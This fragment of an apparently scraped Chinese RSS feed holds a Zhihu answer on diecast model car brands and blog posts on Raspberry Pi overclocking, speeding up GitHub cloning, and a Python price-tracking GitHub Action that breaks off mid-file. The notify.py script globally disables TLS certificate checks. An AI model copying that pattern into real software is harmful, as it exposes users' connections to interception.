data-watermark-src=\"v2-95cbb12c2710378030647dafc371a290\" data-private-watermark-src=\"v2-3f0c2a26e78fbd95ec5a72adc8595779\"></p>\n<p>当然也有稍好一些的，比如威利的林肯领航员，型准、镀铬细节都进步很大，只是后门依旧不能开：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-13d921c3575cfa2d8e0c05e4f30104be_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"717\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-13d921c3575cfa2d8e0c05e4f30104be\" data-watermark-src=\"v2-da3ca76f33ba14ae7b7b9f0e7de5139f\" data-private-watermark-src=\"v2-f8f1a05106fd24ba539a82758b815905\"></p>\n<p>当然，还有一部分模型是可以做到 300-500 左右区间的原厂模型，可以做到全开门，不错的型准，后视镜、油箱盖等小细节可以动，但是差距依旧明显，比如漆面，相比成熟品牌会更容易起疹。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fdf6d41c395799367c82f04d235c705c_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"854\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-fdf6d41c395799367c82f04d235c705c\" data-watermark-src=\"v2-51abdf291b1a91917a257f27ef8f9573\" data-private-watermark-src=\"v2-de872cf7ca173ab5aa00f510a527ebdb\"></p>\n<p> 这是十年前的情况，10 年间，整个静态模型的市场发生了翻天覆地的变化。整个世界范围内，似乎只有中国大陆对于这种大比例的静态模型还保持不错的兴趣和市场规模，其他市场合金静态模型市场快速萎缩，逐渐取而代之的是各种成本更低，形态效果更好，但是全封闭可玩性极低的树脂模型。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6f67128840dfcdb09e837dedbb39564e_720w.jpg?rss\" data-rawwidth=\"750\" data-rawheight=\"500\" data-size=\"normal\" data-caption=\"售价 1200 块的京商世纪树脂模型，内饰居然全是贴纸\" data-watermark=\"original\" data-original-src=\"v2-6f67128840dfcdb09e837dedbb39564e\" data-watermark-src=\"v2-67c7b2acb666bd9c6d8608724960bfed\" data-private-watermark-src=\"v2-6bf4d07a372ae7e18d3e166df2c874f5\"></p>\n<p>曾经在主流价位数一数二的巨头全部转向了其他的方向，迷你切和京商开始减少全开合金模型的开发，更多转向树脂材质，京商尚有劳斯莱斯幻影系列模型撑场，可以调整的座椅、中央扶手箱、后视镜、甚至独立的雨伞，做到巅峰的可玩性。可惜这款产品虽然在不断刷色，但是似乎依旧没有回本。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1d02a668fd20679b522ee531cf557437_720w.jpg?rss\" data-rawwidth=\"796\" data-rawheight=\"796\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-1d02a668fd20679b522ee531cf557437\" data-watermark-src=\"v2-794148c736e988ea27da01daad94a8be\" data-private-watermark-src=\"v2-0f51947cf723ad069a74c5c6aef7936f\"></p>\n<p>迷你切的合金系列甚至开始出现无法做到全开的作品，退步相当大，比如奥迪 RS6 模型和复刻后不能开后备箱的银色 300SL。堪称耻辱，现在更是玩上了合金龟车。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6b6220b91706ae21e3bccd405e35bddd_720w.jpg?rss\" data-rawwidth=\"800\" data-rawheight=\"800\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-6b6220b91706ae21e3bccd405e35bddd\" data-watermark-src=\"v2-14a6154e108378d9f46daecd38dfa375\" data-private-watermark-src=\"v2-206f0e04ca7a080b4acd9c34aa8755c6\"></p>\n<p>AutoArt 倒是一直坚持在高品质全开门模型上，但是材质从锌合金转变为复合材质，说人话就是，有了更多塑料材料的成分在，售价也逐渐涨到 1000 甚至 1500 以上，并复刻了不少曾经的经典车型，比如捷豹 E-Type。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c72719d872a2292d3774b9b2bc0ad1ef_720w.jpg?rss\" data-rawwidth=\"1620\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c72719d872a2292d3774b9b2bc0ad1ef\" data-watermark-src=\"v2-11fc85857100ff0d9f9f3b18ce44df97\" data-private-watermark-src=\"v2-3561dc3245e980fb86eaf02933ea956e\"></p>\n<p>而在大陆这篇目前最为繁茂的成品合金模型市场上，又有广东这个曾经几乎主流品牌都有代工厂的所在地，目前的国产模型已经是这个样子了：</p>\n<p>首先是因为知名大 V 许群加入而知名度极高的 Almost Real，起点就相当高，1000 元出头的路虎系列和奔驰迈巴赫系列，做出了相当丰富的细节、可动件，这在除了 AA 以外的主流价位海外品牌身上已经许久没有看到了，如今产品价格也冲向了 1500 以上更高的区间。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7de9e6847d3f5d1bc2f2d796ef195208_720w.jpg?rss\" data-rawwidth=\"800\" data-rawheight=\"1149\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-7de9e6847d3f5d1bc2f2d796ef195208\" data-watermark-src=\"v2-a802de625c91351837198f43cf8c7a09\" data-private-watermark-src=\"v2-f466467d0e34c3eb2dccf60e12c0c555\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-1f846442c0f1046649c9d21bb991baf9_720w.jpg?rss\" data-rawwidth=\"800\" data-rawheight=\"1140\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-1f846442c0f1046649c9d21bb991baf9\" data-watermark-src=\"v2-e95b9757651ede083ec0449bddcb0d3e\" data-private-watermark-src=\"v2-a53f2529a9c4d7b360620a8ff2289c81\"></p>\n<p>世纪龙也是近两年异军突起的一个新兴品牌，这家总部设在香港的模型品牌是做红旗模型最好的牌子，在不到千元的价格里把红旗还原到极致。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-993b98096c38c2c04619e27508e658f2_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"854\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-993b98096c38c2c04619e27508e658f2\" data-watermark-src=\"v2-e635b12e316d809e9c85f4bf4196e81e\" data-private-watermark-src=\"v2-ca4d719a5904c1c62ebd0d79840dcae7\"></p>\n<p>然后是小光最新的 1:18 凯迪拉克 Fleetwood：同样全开模型，美式豪华车的大皮革沙发细节，中网的镂空，展现的淋漓尽致，价格也达到了 1350 元。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c384a64b33065af7fc53589d040d958a_720w.jpg?rss\" data-rawwidth=\"500\" data-rawheight=\"375\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c384a64b33065af7fc53589d040d958a\" data-watermark-src=\"v2-bfbc21c19f05c6014b938a79c36b02d1\" data-private-watermark-src=\"v2-35366950f29d3ac8538fda73724049b6\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-096925c6cd2e414c3b05415284768a7d_720w.jpg?rss\" data-rawwidth=\"500\" data-rawheight=\"375\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-096925c6cd2e414c3b05415284768a7d\" data-watermark-src=\"v2-a3be635d5c732547b487a401e7473449\" data-private-watermark-src=\"v2-4831629998746d64a157f7bd6a25a598\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-4d0f278c00f9b59a4313bb6e80583948_720w.jpg?rss\" data-rawwidth=\"975\" data-rawheight=\"975\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4d0f278c00f9b59a4313bb6e80583948\" data-watermark-src=\"v2-532be36521a266bea25833b7024f99de\" data-private-watermark-src=\"v2-afcceadbd5988fed39e5ab03076253ed\"></p>\n<p>其辉虽然和其他品牌比起来有些弱，但是在 1000 元左右也有立得住脚的产品，比如堪称 CMC 平替的普尔曼，相比 CMC 4000 多的售价，其辉用 1600 元做出了八成功力，也是相当不错的选择。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8dc3c9f5c3ec4b10cae340198fd08049_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"481\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-8dc3c9f5c3ec4b10cae340198fd08049\" data-watermark-src=\"v2-b365658a7116b1620df1b979da6162a6\" data-private-watermark-src=\"v2-b0c09efb5d3cc3ee6c2225c58042e511\"></p>\n<p>如今国产模型已经冲刺到较高端的主流市场，同时收到了市场的认可。这些品牌能和 AA 能打的有来有回，虽然 Almost Real  因为收藏路线问题一直没有收，Fleetwood 已经是确定要入的了，至于其辉，我已经有 CMC 了，再买问题就在房子不在模型了……</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a43c1be4bb9e3d44d36bae2dbcfe7ad6_720w.jpg?rss\" data-rawwidth=\"1620\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-a43c1be4bb9e3d44d36bae2dbcfe7ad6\" data-watermark-src=\"v2-7caa3d6d6c831a8c6d6fd5c8ffeb46b2\" data-private-watermark-src=\"v2-14e834606ccda55a7f30693466ecd654\"></p>\n<p><br></p>\n<hr>\n<p>刚好今天瞅见了，给你们看看曾经的国际大厂如今复刻老车型有多对付，minichamps 新的 E34，倒是六门可开，没想到这个前后死鱼眼分毫不改，同时淘宝售价 1200，累了。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6aa7653408047b570fc30804512448e3_720w.jpeg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"original\" data-original-src=\"v2-6aa7653408047b570fc30804512448e3\" data-watermark-src=\"v2-e56549901bea2040316c75c1372f9d17\" data-private-watermark-src=\"v2-87fcb7bac50607f1804f28d4efb5a83f\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-58b01411a27dbb127a6e38a43cfa5f22_720w.jpeg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"original\" data-original-src=\"v2-58b01411a27dbb127a6e38a43cfa5f22\" data-watermark-src=\"v2-29ee68c98fef615ed596d21385d49041\" data-private-watermark-src=\"v2-2dfae0822b9fbf62b04d35d7c644457d\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/mo-fu-ping-sheng-zhi?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">逐行扫描</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/40669780/answer/1978083632?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">276 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/265589988?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">想找一个拼装玩具？</a><br><a href=\"http://www.zhihu.com/question/268619884?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">小孩子经常打扰我工作，有什么方法或者玩具车能让他安静的呆一边玩去？</a><br>\n","link":"http://www.zhihu.com/question/40669780/answer/1978083632?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price 